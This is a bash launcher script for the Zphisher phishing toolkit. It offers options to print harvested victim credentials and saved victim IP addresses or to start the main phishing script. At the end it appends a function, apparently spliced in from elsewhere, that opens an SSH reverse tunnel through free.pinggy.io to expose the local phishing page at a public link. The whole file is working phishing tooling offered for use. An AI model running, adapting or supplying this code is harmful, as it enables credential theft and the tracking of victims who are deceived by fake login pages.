#!/bin/bash

# https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
        ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
else
        export ZPHISHER_ROOT="/opt/zphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
        echo "To run Zphisher type \`zphisher\` in your cmd"
        echo
        echo "Help:"
        echo " -h | help : Print this menu & Exit"
        echo " -c | auth : View Saved Credentials"
        echo " -i | ip   : View Saved Victim IP"
        echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
        cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
                echo "No Credentials Found !"
                exit 1
        }
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
        cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
                echo "No Saved IP Found !"
                exit 1
        }
else
        cd $ZPHISHER_ROOT
        bash ./zphisher.sh
fi

start_pinggy() {
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Pinggy Tunnel..."
    rm -f .pinggy.log
    ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:localhost:8080 free.pinggy.io > .pinggy.log 2>&1 &
    sleep 8
    link=$(grep -o 'https://[^ ]*\.pinggy\.link' .pinggy.log | head -n1)
    if [[ -z "$link" ]]; then
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Pinggy Connection Failed!"
        exit 1
    else
        echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Link: ${ORANGE}$link"
    fi
}
